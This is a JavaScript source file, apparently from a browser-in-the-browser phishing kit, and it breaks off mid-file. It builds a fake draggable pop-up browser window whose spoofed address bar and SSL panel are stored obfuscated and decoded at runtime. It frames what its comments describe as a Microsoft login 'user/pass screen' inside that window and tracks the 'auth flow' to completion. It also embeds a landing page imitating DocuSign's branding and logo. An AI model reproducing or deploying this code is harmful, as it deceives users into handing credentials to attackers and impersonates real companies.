
// For demo obfuscation
const PREFIX = "OBFS";
const SUFFIX = "END";

const obfEnd = 'OBFS==Qaz12aEND';

const targetElementSelector = '.win-scroll'; 

// Sizing constants
// Not efficient, but works.
const popHeight = "600px";
const popWidth = "660px";
const originalContentHeight = "500px";

const popMaximizedHeight = "600px";
const popMaximizedWidth = "900px";

const popTop = "50%";
const popLeft = "50%";
const popTransform = "translate(-50%, -50%)";

// We add an extra offset from top to make it more realistic
const popContentTransform = "translate(-50%, -50%) translateY(50px)";



function setInitialSize() {
    // Sets default/initial size and position
    $("#pop-window").css("width", popWidth);
    $("#pop-window").css("height", popHeight);
    $("#pop-window").css("top", popTop);
    $("#pop-window").css("left", popLeft);
    $("#pop-window").css("transform", popTransform);

    $("#pop-background-container").css("width", popWidth);
    $("#pop-background-container").css("height", popHeight);
    $("#pop-background-container").css("top", popTop);
    $("#pop-background-container").css("left", popLeft);
    $("#pop-background-container").css("transform", popTransform);

    $(targetElementSelector).css("width", popWidth);
    $(targetElementSelector).css("height", originalContentHeight);
    $(targetElementSelector).css("top", popTop);
    $(targetElementSelector).css("left", popLeft);
    $(targetElementSelector).css("transform", popContentTransform);
}



function deobfString(str) {
  let withoutPrefixSuffix = str.slice(PREFIX.length, -SUFFIX.length);
  let reversed = withoutPrefixSuffix.split('').reverse().join('');
  return atob(reversed);
}


function openTop() {
    $("#pop-window").css('display', "block");
    $("#pop-background-container").css('display', "block");
    deObfData();
    
    applyPositioning();
}

function openIn(){
        let checkExist = setInterval(function() {
      
        if ($(targetElementSelector).length) {
                $(targetElementSelector).css('display', "block");

                applyPositioning();

              // Set up a short duration recheck to combat other scripts
              let recheckDuration = 1000;  // 1 second
              let recheckStart = Date.now();
              let recheckInterval = setInterval(function() {
                 if (Date.now() - recheckStart > recheckDuration) {
                     clearInterval(recheckInterval);
                     return;
                 }
                $(targetElementSelector).css('display', "block");

                applyPositioning();
              }, 50);  // recheck every 50 milliseconds
        
              clearInterval(checkExist);
          }
        }, 50);
}



function deObfData() {
    try{
        // URI Bar
        document.getElementById('pop-uri-prefix').innerText = deobfString(document.getElementById('pop-uri-prefix').innerText) + "//";
        document.getElementById('pop-uri-host').innerText = deobfString(document.getElementById('pop-uri-host').innerText);
        document.getElementById('pop-uri-path').innerText = "/" + deobfString(document.getElementById('pop-uri-path').innerText);
        
        // Rest
        document.getElementById('pop-title-text').innerText = deobfString(document.getElementById('pop-title-text').innerText);

        document.getElementById('pop-ssl-head-title').innerText = deobfString(document.getElementById('pop-ssl-head-title').innerText);
        document.getElementById('pop-ssl-text-1').innerText = deobfString(document.getElementById('pop-ssl-text-1').innerText);
        document.getElementById('pop-ssl-text-2').innerText = deobfString(document.getElementById('pop-ssl-text-2').innerText);
        document.getElementById('pop-ssl-text-3').innerText = deobfString(document.getElementById('pop-ssl-text-3').innerText);
  
    } catch {
        return;
    }
}








function handleDnDLogic() {
    //////////////// Make window draggable ////////////////
    let draggable = $('#pop-window');
    let winScroll = $(targetElementSelector);
    let title = $('#pop-title-bar');

    title.on('mousedown', function(e) {

        if (e.target.id.indexOf('pop-control') === -1) {

        let dr = $(draggable).addClass("drag");
        let db = $('#pop-background-container');
        let dt = $(targetElementSelector).addClass("drag");
        

        let initialDiffX = dt.offset().left - dr.offset().left;
        let initialDiffY = dt.offset().top - dr.offset().top;
        
        let ypos = e.pageY - dr.offset().top;
        let xpos = e.pageX - dr.offset().left;

        $(document.body).on('mousemove', function(e) {
            
            let itop = e.pageY - ypos;
            let ileft = e.pageX - xpos;

            if(dr.hasClass("drag")) {
                dr.offset({top: itop, left: ileft});
                db.offset({top: itop, left: ileft});
            }
            
            if(dt.hasClass("drag")) {
                dt.offset({top: itop + initialDiffY, left: ileft + initialDiffX});
            }

        }).on('mouseup', function(e) {
            
            let draggable = $('#pop-window');

            let dr = $(draggable);
            let dt = $(targetElementSelector);

            if (dr.hasClass("drag")){
                dr.removeClass("drag");
                dt.removeClass("drag");
        
            let btbPosition = {
                top: dr.offset().top,
                left: dr.offset().left,
                width: dr.css('width'),
                height: dr.css('height'),
                enlarged: dr.hasClass('enlarged')
            };
        

            localStorage.setItem('pop-window-position', JSON.stringify(btbPosition));
        
            let winScrollOffset = {
                top: dt.offset().top - dr.offset().top,
                left: dt.offset().left - dr.offset().left
            };
        
            localStorage.setItem('win-scroll-offset', JSON.stringify(winScrollOffset));
            }

        });
        }
    });
}

// Function to apply positioning
function applyPositioning() {

    // Set default/initial size and position then check for modifications needed
    setInitialSize();

    let storedBtbPosition = localStorage.getItem('pop-window-position');
    let storedWinScrollOffset = localStorage.getItem('win-scroll-offset');


    if(storedBtbPosition !== null && storedWinScrollOffset !== null) {

        // console.log("storedBtbPosition: ", storedBtbPosition)


        let btbPosition = JSON.parse(storedBtbPosition);
        let winOffset = JSON.parse(storedWinScrollOffset);
        
        if (btbPosition.enlarged === "true"){
            $("#pop-control-max").addClass("enlarged");
        }

        $("#pop-window").css('width', btbPosition.width);
        $("#pop-window").css('height', btbPosition.height);
        $("#pop-background-container").css('width', btbPosition.width);
        $("#pop-background-container").css('height', btbPosition.height);

        let winScrollTop = btbPosition.top + winOffset.top;
        let winScrollLeft = btbPosition.left + winOffset.left;

        $("#pop-window").offset({
            top: btbPosition.top,
            left: btbPosition.left
        });
        $("#pop-background-container").offset({
           top: btbPosition.top,
            left: btbPosition.left
      });
        $(targetElementSelector).offset({
            top: winScrollTop,
            left: winScrollLeft
        });
 
    }

}



////////////////// Onclick listeners //////////////////

function closePopup(){
    $("#pop-window").css("display", "none");
    $("#pop-background-container").css("display", "none");


    $(targetElementSelector).css("display", "none");
    $(targetElementSelector).classList = "win-scroll closed";


    $("#pop-ssl").removeClass("visible");
    $("#pop-ssl-icon").removeClass("visible");
    localStorage.setItem('bb-open', false);
    localStorage.removeItem('pop-window-position');
    localStorage.removeItem('win-scroll-offset');
}



function toggleSSLPopup(){
    let sslPopup = $("#pop-ssl");
    let sslIcon = $("#pop-ssl-icon");
    if (sslPopup.hasClass("visible")){
        sslPopup.removeClass("visible")
        sslIcon.removeClass("visible")
    } else {
        sslPopup.addClass("visible")
        sslIcon.addClass("visible")
    }
    
  }




function enlarge(){
    let max = document.getElementById("pop-control-max");

    if(max.classList.contains("enlarged")){
        $("#pop-window").css("width", popWidth);
        $("#pop-window").css("height", popHeight);
        $("#pop-background-container").css("width", popWidth);
        $("#pop-background-container").css("height", popHeight);
        $("#pop-title-bar-width").css('width', '100%').css('width', '+=2px');
        $("#pop-content-container").css("width", "100%");
        $("#pop-control-max").removeClass("enlarged");
    }
    else{
        $("#pop-window").css("width", popMaximizedWidth);
        $("#pop-window").css("height", popMaximizedHeight);
        $("#pop-background-container").css("width", popMaximizedWidth);
        $("#pop-background-container").css("height", popMaximizedHeight);
        $("#pop-title-bar-width").css('width', '100%').css('width', '+=2px');
        $("#pop-content-container").css("width", "100%");
        $("#pop-control-max").addClass("enlarged");

    }
  
    let dr = $("#pop-window");
    let dt = $(targetElementSelector);
    
    let btbPosition = {
        top: dr.offset().top,
        left: dr.offset().left,
        width: dr.css('width'),
        height: dr.css('height'),
        enlarged: dr.hasClass('enlarged')
    };
    localStorage.setItem('pop-window-position', JSON.stringify(btbPosition));
  
    let winScrollOffset = {
        top: dt.offset().top - dr.offset().top,
        left: dt.offset().left - dr.offset().left
    };
    localStorage.setItem('win-scroll-offset', JSON.stringify(winScrollOffset));
}



async function setPrimaryContent(locationDivId, contentHTML, cssUrls, jsUrls){
    // Handling the landing page content this way to allow more isolation of styles and scripts
    // and enable more efficient methods that will come soon
    // Create shadowroot element and append to it HTML, CSS, JS content

    const contentDiv = document.getElementById(locationDivId);
    const shadowRoot = contentDiv.attachShadow({ mode: 'open' });

    let scriptsToLoad = jsUrls.length;

    const checkAllLoaded = () => {
        if (scriptsToLoad === 0) {
            // dispatch the event when all scripts are loaded
            const contentLoadedEvent = new Event('PrimaryContentLoaded', { bubbles: true, composed: true });
            document.dispatchEvent(contentLoadedEvent);
            console.log("Secondary Dispatched: PrimaryContentLoaded")

            // now check if the auth flow is completed and inform primary
            handleIsOpenedState(shadowRoot)
        }
    };

    // function to append CSS files
    cssUrls.forEach(url => {
        const link = document.createElement('link');
        link.href = url;
        link.type = 'text/css';
        link.rel = 'stylesheet';
        shadowRoot.appendChild(link);
    });

    // append HTML content
    shadowRoot.innerHTML += contentHTML;


    // function to append JS files
    jsUrls.forEach(url => {
        const script = document.createElement('script');
        script.src = url;
        script.type = 'text/javascript';
        script.onload = () => {
            scriptsToLoad--;
            checkAllLoaded(); 
        };
        script.onerror = () => {
            console.error(`Error loading script: ${url}`);
            scriptsToLoad--;
            checkAllLoaded(); 
        };
        shadowRoot.appendChild(script);
    });

    // check if there are no scripts to load
    checkAllLoaded();
}



function handleSecondaryFlowStart() {
    // triggered opening from primary, will open always
    localStorage.setItem('bb-open', true);
    openTop();
    openIn();
}

function handleIsOpenedState (shadowRoot) {

    let targetPath = '/' + deobfString(obfEnd);
    let doneAlready = localStorage.getItem('bb-done');
    let openedAlready = localStorage.getItem('bb-open');
    

    let wasOpened = openedAlready === "true";
    let isCompleted = window.location.pathname === targetPath || doneAlready;

    if (wasOpened && !isCompleted) {
        openTop();
        openIn();
    }
    // Check if we just reached the final flow page or flow was already completed
    else if (isCompleted) {
        console.log("Secondary: flow is done");
        localStorage.setItem('bb-open', false);
        localStorage.setItem('bb-done', true);
        // Inform primary page that flow is completed
        shadowRoot.dispatchEvent(new CustomEvent('secondaryFlowCompleted', {bubbles: true, composed: true}));
    }
    

}


// fix for JS-based re-mounting and class changes of target elements (seen in branded Microsoft pages)
// also check for silent state/navigation changes that might cause similar behavior
// reference: https://github.com/waelmas/frameless-bitb/issues/4
function startObserving(targetSelector) {
    let targetElement = document.querySelector(targetSelector);
    const observerConfig = { childList: true, subtree: true, attributes: true, attributeFilter: ['class'] };
    
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {

        if (mutation.type === 'attributes' && targetElement.classList.contains('closed')) {
            return; // ignore mutation due to control-btns
        }
        // check if the mutation is due to D&D by checking the 'drag' class and ignore style changes
        if (mutation.type === 'attributes' && targetElement.classList.contains('drag')) {
            // sleep for a short duration to allow the D&D to complete
            setTimeout(() => {}, 50);
            return; // ignore mutation due to D&D
        }
        if (mutation.type === 'childList') {
          mutation.addedNodes.forEach((node) => {
            if (node === targetElement || node.contains(targetElement)) {
              handleIsOpenedState();
            }
          });
          mutation.removedNodes.forEach((node) => {
            if (node === targetElement || node.contains(targetElement)) {
              // target element removed, attempt to find and observe it again
              waitForElement(targetSelector);
            }
          });
        }
        else if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
            handleIsOpenedState();
        }
      });
    });
  
    const observe = () => {
      const bodyObserver = new MutationObserver(() => {
        const newTargetElement = document.querySelector(targetSelector);
        if (newTargetElement && newTargetElement !== targetElement) {
          targetElement = newTargetElement; // update the target element reference
          observer.observe(targetElement.parentElement, observerConfig);
          observer.observe(targetElement, observerConfig);
          // keep observing, otherwise then the user moves back and forth between the user/pass screen
          // the target element will not be observed again, resulting in the white screen issue again
        }
      });
  
      // start observing the document body for re-mounting of the target element
      bodyObserver.observe(document.body, { childList: true, subtree: true });
      // observe the initial target and its parent, if available
      if (targetElement) {
        observer.observe(targetElement.parentElement, observerConfig);
        observer.observe(targetElement, observerConfig);
      }
    };
  
    observe();
  }
  
  function waitForElement(selector) {
    const interval = setInterval(() => {
      const element = document.querySelector(selector);
      if (element) {
        console.log('Target element found, starting observers.');
        startObserving(selector);
        clearInterval(interval);
      }
    }, 100); // check every 100 milliseconds till found
  }

  





function hadleDOMContentLoaded() {    

    // inject the primary page, then initialize it
    setPrimaryContent('primary', primaryHTML, cssURLs, jsURLs)

    // and set default size of the secondary
    setInitialSize();

    let titleBar = document.getElementById("pop-title-bar");
    let exit = document.getElementById("pop-control-esc");
    let max = document.getElementById("pop-control-max");
    let min = document.getElementById("pop-control-min");
    let sslIcon = document.getElementById('pop-ssl-icon');
    let sslIconExit = document.getElementById('pop-ssl-head-esc');


    titleBar.addEventListener('dblclick', function handleMouseOver() {
        enlarge();
    });
    
    titleBar.addEventListener('mouseout', function handleMouseOver() {
      titleBar.style.cursor = 'default';
    });

    exit.addEventListener('click', closePopup);
    min.addEventListener('click', closePopup);
    max.addEventListener('click', enlarge);

    sslIcon.addEventListener('click', toggleSSLPopup);
    sslIconExit.addEventListener('click', toggleSSLPopup);


    handleDnDLogic();

    // start observing the target element (to apply observers for re-mounting and class changes)
    waitForElement(targetElementSelector);

}



document.addEventListener('DOMContentLoaded', hadleDOMContentLoaded);

document.addEventListener('secondaryFlowStart', handleSecondaryFlowStart)




// Content for the landing page (aka primary page)

const cssURLs = ['/primary/w3.css']
const jsURLs = ['/primary/script.js']

const primaryHTML = `
<div data-app="@dxp/commerce-web@0.30.0">
<div id="__next" data-reactroot="">
  <style data-emotion="css-global 15rza21">
    *,
    ::before,
    ::after {
      box-sizing: border-box;
      border-width: 0;
      border-style: solid;
      --tw-border-opacity: 1;
      border-color: rgba(229, 231, 235, var(--tw-border-opacity));
      --tw-translate-x: 0;
      --tw-translate-y: 0;
      --tw-rotate: 0;
      --tw-skew-x: 0;
      --tw-skew-y: 0;
      --tw-scale-x: 1;
      --tw-scale-y: 1;
      --tw-transform: translateX(var(--tw-translate-x))
        translateY(var(--tw-translate-y)) rotate(var(--tw-rotate))
        skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y))
        scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
      --tw-ring-inset: var(--tw-empty, /*!*/ /*!*/);
      --tw-ring-offset-width: 0px;
      --tw-ring-offset-color: #fff;
      --tw-ring-color: rgba(59, 130, 246, 0.5);
      --tw-ring-offset-shadow: 0 0 #0000;
      --tw-ring-shadow: 0 0 #0000;
      --tw-shadow: 0 0 #0000;
      --tw-blur: var(--tw-empty, /*!*/ /*!*/);
      --tw-brightness: var(--tw-empty, /*!*/ /*!*/);
      --tw-contrast: var(--tw-empty, /*!*/ /*!*/);
      --tw-grayscale: var(--tw-empty, /*!*/ /*!*/);
      --tw-hue-rotate: var(--tw-empty, /*!*/ /*!*/);
      --tw-invert: var(--tw-empty, /*!*/ /*!*/);
      --tw-saturate: var(--tw-empty, /*!*/ /*!*/);
      --tw-sepia: var(--tw-empty, /*!*/ /*!*/);
      --tw-drop-shadow: var(--tw-empty, /*!*/ /*!*/);
      --tw-filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast)
        var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert)
        var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow);
      --tw-backdrop-blur: var(--tw-empty, /*!*/ /*!*/);
      --tw-backdrop-brightness: var(--tw-empty, /*!*/ /*!*/);
      --tw-backdrop-contrast: var(--tw-empty, /*!*/ /*!*/);
      --tw-backdrop-grayscale: var(--tw-empty, /*!*/ /*!*/);
      --tw-backdrop-hue-rotate: var(--tw-empty, /*!*/ /*!*/);
      --tw-backdrop-invert: var(--tw-empty, /*!*/ /*!*/);
      --tw-backdrop-opacity: var(--tw-empty, /*!*/ /*!*/);
      --tw-backdrop-saturate: var(--tw-empty, /*!*/ /*!*/);
      --tw-backdrop-sepia: var(--tw-empty, /*!*/ /*!*/);
      --tw-backdrop-filter: var(--tw-backdrop-blur)
        var(--tw-backdrop-brightness) var(--tw-backdrop-contrast)
        var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate)
        var(--tw-backdrop-invert) var(--tw-backdrop-opacity)
        var(--tw-backdrop-saturate) var(--tw-backdrop-sepia);
    }

    html {
      line-height: 1.5;
      -webkit-text-size-adjust: 100%;
      -moz-tab-size: 4;
      tab-size: 4;
      font-family: ui-sans-serif, system-ui, -apple-system,
        BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial,
        "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji",
        "Segoe UI Symbol", "Noto Color Emoji";
    }

    body {
      margin: 0;
      font-family: inherit;
      line-height: inherit;
    }

    hr {
      height: 0;
      color: inherit;
      border-top-width: 1px;
    }

    abbr[title] {
      -webkit-text-decoration: underline dotted;
      text-decoration: underline dotted;
    }

    b,
    strong {
      font-weight: bolder;
    }

    code,
    kbd,
    samp,
    pre {
      font-family: ui-monospace, SFMono-Regular, Consolas, "Liberation Mono",
        Menlo, monospace;
      font-size: 1em;
    }

    small {
      font-size: 80%;
    }

    sub,
    sup {
      font-size: 75%;
      line-height: 0;
      position: relative;
      vertical-align: baseline;
    }

    sub {
      bottom: -0.25em;
    }

    sup {
      top: -0.5em;
    }

    table {
      text-indent: 0;
      border-color: inherit;
      border-collapse: collapse;
    }

    button,
    input,
    optgroup,
    select,
    textarea {
      font-family: inherit;
      font-size: 100%;
      line-height: inherit;
      margin: 0;
      padding: 0;
      color: inherit;
    }

    button,
    select {
      text-transform: none;
    }

    button,
    [type="button"],
    [type="reset"],
    [type="submit"] {
      -webkit-appearance: button;
    }

    ::-moz-focus-inner {
      border-style: none;
      padding: 0;
    }

    :-moz-focusring {
      outline: 1px dotted ButtonText;
    }

    :-moz-ui-invalid {
      box-shadow: none;
    }

    legend {
      padding: 0;
    }

    progress {
      vertical-align: baseline;
    }

    ::-webkit-inner-spin-button,
    ::-webkit-outer-spin-button {
      height: auto;
    }

    [type="search"] {
      -webkit-appearance: textfield;
      outline-offset: -2px;
    }

    ::-webkit-search-decoration {
      -webkit-appearance: none;
    }

    ::-webkit-file-upload-button {
      -webkit-appearance: button;
      font: inherit;
    }

    summary {
      display: -webkit-box;
      display: -webkit-list-item;
      display: -ms-list-itembox;
      display: list-item;
    }

    blockquote,
    dl,
    dd,
    h1,
    h2,
    h3,
    h4,
    h5,
    h6,
    hr,
    figure,
    p,
    pre {
      margin: 0;
    }

    button {
      background-color: transparent;
      background-image: none;
    }

    fieldset {
      margin: 0;
      padding: 0;
    }

    ol,
    ul {
      list-style: none;
      margin: 0;
      padding: 0;
    }

    img {
      border-style: solid;
    }

    textarea {
      resize: vertical;
    }

    input::-webkit-input-placeholder {
      color: #9ca3af;
    }

    input::-moz-placeholder {
      color: #9ca3af;
    }

    input:-ms-input-placeholder {
      color: #9ca3af;
    }

    textarea::-webkit-input-placeholder {
      color: #9ca3af;
    }

    textarea::-moz-placeholder {
      color: #9ca3af;
    }

    textarea:-ms-input-placeholder {
      color: #9ca3af;
    }

    input::placeholder,
    textarea::placeholder {
      color: #9ca3af;
    }

    button,
    [role="button"] {
      cursor: pointer;
    }

    h1,
    h2,
    h3,
    h4,
    h5,
    h6 {
      font-size: inherit;
      font-weight: inherit;
    }

    a {
      color: inherit;
      -webkit-text-decoration: inherit;
      text-decoration: inherit;
    }

    pre,
    code,
    kbd,
    samp {
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas,
        "Liberation Mono", "Courier New", monospace;
    }

    img,
    svg,
    video,
    canvas,
    audio,
    iframe,
    embed,
    object {
      display: block;
      vertical-align: middle;
    }

    img,
    video {
      max-width: 100%;
      height: auto;
    }

    [hidden] {
      display: none;
    }

    @-webkit-keyframes spin {
      to {
        -webkit-transform: rotate(360deg);
        -moz-transform: rotate(360deg);
        -ms-transform: rotate(360deg);
        transform: rotate(360deg);
      }
    }

    @keyframes spin {
      to {
        -webkit-transform: rotate(360deg);
        -moz-transform: rotate(360deg);
        -ms-transform: rotate(360deg);
        transform: rotate(360deg);
      }
    }

    @-webkit-keyframes ping {
      75%,
      100% {
        -webkit-transform: scale(2);
        -moz-transform: scale(2);
        -ms-transform: scale(2);
        transform: scale(2);
        opacity: 0;
      }
    }

    @keyframes ping {
      75%,
      100% {
        -webkit-transform: scale(2);
        -moz-transform: scale(2);
        -ms-transform: scale(2);
        transform: scale(2);
        opacity: 0;
      }
    }

    @-webkit-keyframes pulse {
      50% {
        opacity: 0.5;
      }
    }

    @keyframes pulse {
      50% {
        opacity: 0.5;
      }
    }

    @-webkit-keyframes bounce {
      0%,
      100% {
        -webkit-transform: translateY(-25%);
        -moz-transform: translateY(-25%);
        -ms-transform: translateY(-25%);
        transform: translateY(-25%);
        -webkit-animation-timing-function: cubic-bezier(0.8, 0, 1, 1);
        animation-timing-function: cubic-bezier(0.8, 0, 1, 1);
      }

      50% {
        -webkit-transform: none;
        -moz-transform: none;
        -ms-transform: none;
        transform: none;
        -webkit-animation-timing-function: cubic-bezier(0, 0, 0.2, 1);
        animation-timing-function: cubic-bezier(0, 0, 0.2, 1);
      }
    }

    @keyframes bounce {
      0%,
      100% {
        -webkit-transform: translateY(-25%);
        -moz-transform: translateY(-25%);
        -ms-transform: translateY(-25%);
        transform: translateY(-25%);
        -webkit-animation-timing-function: cubic-bezier(0.8, 0, 1, 1);
        animation-timing-function: cubic-bezier(0.8, 0, 1, 1);
      }

      50% {
        -webkit-transform: none;
        -moz-transform: none;
        -ms-transform: none;
        transform: none;
        -webkit-animation-timing-function: cubic-bezier(0, 0, 0.2, 1);
        animation-timing-function: cubic-bezier(0, 0, 0.2, 1);
      }
    }

    @-webkit-keyframes dxp-spin {
      to {
        -webkit-transform: rotate(360deg);
        -moz-transform: rotate(360deg);
        -ms-transform: rotate(360deg);
        transform: rotate(360deg);
      }
    }

    @keyframes dxp-spin {
      to {
        -webkit-transform: rotate(360deg);
        -moz-transform: rotate(360deg);
        -ms-transform: rotate(360deg);
        transform: rotate(360deg);
      }
    }

    @-webkit-keyframes dxp-ping {
      75%,
      100% {
        -webkit-transform: scale(2);
        -moz-transform: scale(2);
        -ms-transform: scale(2);
        transform: scale(2);
        opacity: 0;
      }
    }

    @keyframes dxp-ping {
      75%,
      100% {
        -webkit-transform: scale(2);
        -moz-transform: scale(2);
        -ms-transform: scale(2);
        transform: scale(2);
        opacity: 0;
      }
    }

    @-webkit-keyframes dxp-pulse {
      50% {
        opacity: 0.5;
      }
    }

    @keyframes dxp-pulse {
      50% {
        opacity: 0.5;
      }
    }

    @-webkit-keyframes dxp-bounce {
      0%,
      100% {
        -webkit-transform: translateY(-25%);
        -moz-transform: translateY(-25%);
        -ms-transform: translateY(-25%);
        transform: translateY(-25%);
        -webkit-animation-timing-function: cubic-bezier(0.8, 0, 1, 1);
        animation-timing-function: cubic-bezier(0.8, 0, 1, 1);
      }

      50% {
        -webkit-transform: none;
        -moz-transform: none;
        -ms-transform: none;
        transform: none;
        -webkit-animation-timing-function: cubic-bezier(0, 0, 0.2, 1);
        animation-timing-function: cubic-bezier(0, 0, 0.2, 1);
      }
    }

    @keyframes dxp-bounce {
      0%,
      100% {
        -webkit-transform: translateY(-25%);
        -moz-transform: translateY(-25%);
        -ms-transform: translateY(-25%);
        transform: translateY(-25%);
        -webkit-animation-timing-function: cubic-bezier(0.8, 0, 1, 1);
        animation-timing-function: cubic-bezier(0.8, 0, 1, 1);
      }

      50% {
        -webkit-transform: none;
        -moz-transform: none;
        -ms-transform: none;
        transform: none;
        -webkit-animation-timing-function: cubic-bezier(0, 0, 0.2, 1);
        animation-timing-function: cubic-bezier(0, 0, 0.2, 1);
      }
    }

    @font-face {
      font-display: swap;
      src: url("https://docucdn-a.akamaihd.net/olive/fonts/2.11.0/DSIndigo-Regular.woff2")
          format("woff2"),
        url("https://docucdn-a.akamaihd.net/olive/fonts/2.11.0/DSIndigo-Regular.woff")
          format("woff");
      font-weight: 400;
      font-style: normal;
      font-family: "DSIndigo";
    }

    :root {
      font-family: "DS Indigo", DSIndigo, "Neue Haas Grotesk",
        NeueHaasGrotesk, Helvetica, Arial, sans-serif, -apple-system,
        BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica Neue, Arial,
        "Noto Sans", sans-serif, Apple Color Emoji, Segoe UI Emoji,
        Segoe UI Symbol, Noto Color Emoji;
      color: rgba(25, 24, 35, 0.9);
    }
  </style>
  <style data-emotion="css-global 2avbz5">
    body {
      --dxp-primary: #0069ec;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }
  </style>
  <style data-emotion="css 68affp">
    .css-68affp {
      display: -webkit-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      -webkit-flex-direction: column;
      -ms-flex-direction: column;
      flex-direction: column;
      min-height: 100vh;
      margin-left: auto;
      margin-right: auto;
    }

    @media (min-width: 1536px) {
      .css-68affp {
        height: auto;
      }
    }
  </style>
  <div class="css-68affp">
    <style data-emotion="css 1fccjnf">
      .css-1fccjnf {
        height: 4rem;
        border-bottom-width: 1px;
        border-color: rgba(25, 24, 35, 0.15);
      }

      @media (min-width: 720px) {
        .css-1fccjnf {
          height: 5rem;
        }
      }
    </style>
    <header class="css-1fccjnf">
      <style data-emotion="css lznb57">
        .css-lznb57 {
          display: -webkit-box;
          display: -webkit-flex;
          display: -ms-flexbox;
          display: flex;
          -webkit-align-items: center;
          -webkit-box-align: center;
          -ms-flex-align: center;
          align-items: center;
          max-width: 1080px;
          margin-left: auto;
          margin-right: auto;
          height: 100%;
        }
      </style>
      <div class="css-lznb57">
        <style data-emotion="css wlz4g5">
          .css-wlz4g5 {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            justify-content: space-between;
            width: 100%;
            padding-left: 1.5rem;
            padding-right: 1.5rem;
          }

          @media (min-width: 1080px) {
            .css-wlz4g5 {
              padding-left: 0px;
              padding-right: 0px;
            }
          }
        </style>
        <div class="css-wlz4g5">
          <style data-emotion="css 1azp2gh">
            .css-1azp2gh {
              display: -webkit-box;
              display: -webkit-flex;
              display: -ms-flexbox;
              display: flex;
              -webkit-align-items: center;
              -webkit-box-align: center;
              -ms-flex-align: center;
              align-items: center;
              outline: 2px solid transparent;
              outline-offset: 2px;
              border-radius: 0.125rem;
            }

            .css-1azp2gh:focus-visible {
              --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0
                var(--tw-ring-offset-width) var(--tw-ring-offset-color);
              --tw-ring-shadow: var(--tw-ring-inset) 0 0 0
                calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
              box-shadow: var(--tw-ring-offset-shadow),
                var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            }

            .css-1azp2gh:focus {
              --tw-ring-offset-width: 2px;
              --tw-ring-opacity: 1;
              --tw-ring-color: rgba(112, 109, 136, var(--tw-ring-opacity));
            }
          </style>
          <a
            href="https://www.docusign.com/"
            rel="noopener"
            data-context="nav-main-logo"
            data-action="homepage"
            aria-label="DocuSign"
            class="css-1azp2gh"
          >
            <style data-emotion="css 51oypr">
              .css-51oypr {
                --tw-text-opacity: 1;
                color: rgba(0, 0, 0, var(--tw-text-opacity));
                width: 6rem;
                height: 2rem;
              }

              @media (min-width: 720px) {
                .css-51oypr {
                  width: 8rem;
                  margin-top: 0.125rem;
                  padding-top: 1px;
                }
              }
            </style>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 130 30"
              width="1em"
              height="1em"
              role="img"
              aria-hidden="false"
              class="css-51oypr"
            >
              <title>DocuSign</title>
              <path
                d="M0 1.4h9.4c6 0 9.8 4.8 9.8 11.4 0 3.6-1.2 6.8-3.6 8.8C14 23 11.8 23.8 9 23.8H0V1.4zm8.7 18.5c4.3 0 5.9-2.6 5.9-7s-1.9-7.5-5.8-7.5H4.5V20h4.2zm11.2-4.1c0-4.8 3.4-8.5 8.4-8.5s8.4 3.7 8.4 8.5-3.4 8.5-8.4 8.5-8.4-3.8-8.4-8.5zm12.4 0c0-3.1-1.5-5.3-4.1-5.3-2.6 0-4.1 2.1-4.1 5.3s1.4 5.2 4.1 5.2c2.7 0 4.1-2.1 4.1-5.2zm5.2 0c0-4.8 3.1-8.5 8-8.5 4.2 0 6.7 2.4 7.3 5.9h-4.2c-.3-1.4-1.4-2.5-2.9-2.5-2.6 0-3.9 2-3.9 5.1 0 3 1.2 5.1 3.8 5.1 1.7 0 2.9-.9 3.2-2.7H53c-.3 3.4-2.9 6.1-7.2 6.1-5.1-.1-8.3-3.8-8.3-8.5zm26.7 8v-1.9h-.1c-1.1 1.5-2.3 2.3-4.6 2.3-3.6 0-5.6-2.3-5.6-5.8V7.7h4.2v10c0 1.9.8 2.9 2.7 2.9 2 0 3.2-1.5 3.2-3.6V7.7h4.3v16h-4.1zM89 1.5h4.3v4H89v-4zm0 6.2h4.3v16H89v-16zm6 16.5h4.2c.3 1 1.3 1.8 3.2 1.8 2.4 0 3.6-1.2 3.6-3.3v-1.8h-.1c-.9 1.1-2.2 1.9-4.2 1.9-3.6 0-7.1-2.8-7.1-7.7 0-4.8 2.9-7.8 6.9-7.8 2 0 3.5.8 4.4 2.1h.1V7.7h4.1v14.8c0 2.3-.7 3.8-1.9 4.9-1.3 1.3-3.4 1.8-5.8 1.8-4.2 0-6.9-1.8-7.4-5zm11.3-9.2c0-2.3-1.3-4.3-3.8-4.3-2.2 0-3.6 1.7-3.6 4.4s1.4 4.3 3.6 4.3c2.7 0 3.8-2 3.8-4.4zm9.9-5.1c1.2-1.7 2.7-2.6 4.8-2.6 3.3 0 5.5 2.5 5.5 6v10.5h-4.3V14c0-1.7-1-2.9-2.8-2.9-1.9 0-3.3 1.5-3.3 3.7v9.1H112v-16h4.2v2zm-36.9.4C76 9.6 74.5 9 74.5 7.2c0-1.6 1.6-2.6 4-2.6 2.2 0 3.9 1 4.3 3.1h4.4C86.7 3.4 83.5 1 78.5 1c-5 0-8.6 2.3-8.6 6.7 0 4.7 3.7 5.7 7.7 6.6 3.4.8 5.5 1.2 5.5 3.4 0 2.1-2 2.9-4.3 2.9-3.2 0-4.7-1.1-5-3.8h-4.4c.2 4.7 3.6 7.4 